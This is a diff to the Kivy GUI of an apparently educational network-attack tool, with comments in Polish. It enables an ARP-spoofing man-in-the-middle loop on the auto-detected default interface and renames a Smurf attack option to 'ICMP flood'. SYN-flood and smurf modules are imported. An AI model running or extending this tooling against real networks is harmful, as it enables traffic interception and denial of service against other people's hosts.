@@ -13,6 +13,8 @@ from kivy.uix.popup import Popup
 from modules.arp import ARPSpoofer, disable_ip_forwarding, enable_ip_forwarding
 import os
 
+import netifaces
+
 import modules.auxilliary
 from modules.smurf_attack import smurf_packet
 from modules.syn_flood import syn_flood_packet
@@ -84,10 +86,10 @@ class P1(FloatLayout):
                     P1.d.start()
                 elif (self.ids.spinner_id_atk.text == "ARP spoof"):
                     #ARP do przerobienia, nast odkomentowac
-                    #P1.d = Thread(target=self.ARP, args=(self.ids.spinner_id.text,))
-                    #P1.d.start()
+                    P1.d = Thread(target=self.ARP, args=(self.ids.spinner_id.text,))
+                    P1.d.start()
                     print("ARP")
-                elif (self.ids.spinner_id_atk.text == "Smurf"):
+                elif (self.ids.spinner_id_atk.text == "ICMP flood"):
                     P1.d = Thread(target=self.Smurf, args=(self.ids.spinner_id.text,))
                     P1.d.start()
                 else:
@@ -151,8 +153,15 @@ class P1(FloatLayout):
 
         #to nie będzie działać, trzeba przerobić funkcję tak by dało się ją wylączyć
         enable_ip_forwarding()
-        spoofer = ARPSpoofer("Wlan 0", IP, self.Dane.HOSTS[0])
-        spoofer.mitm()
+        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+        print(iface)
+        spoofer = ARPSpoofer(iface, IP, self.Dane.HOSTS[0])
+        spoofer.mitm_init()
+        
+        while(self.ATTACK_STOP != True):
+            spoofer.mitm_trick()
+        
+        spoofer.reARP()
         disable_ip_forwarding()
         #koniec fragmentu do edycji
 
@@ -160,7 +169,7 @@ class P1(FloatLayout):
         P1.ATTACK_STOP = False
     
     def Smurf(self, IP):
-        print("starting Smurf")
+        print("starting ICMP flood")
         self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"
         while(self.ATTACK_STOP != True):
             smurf_packet(IP)
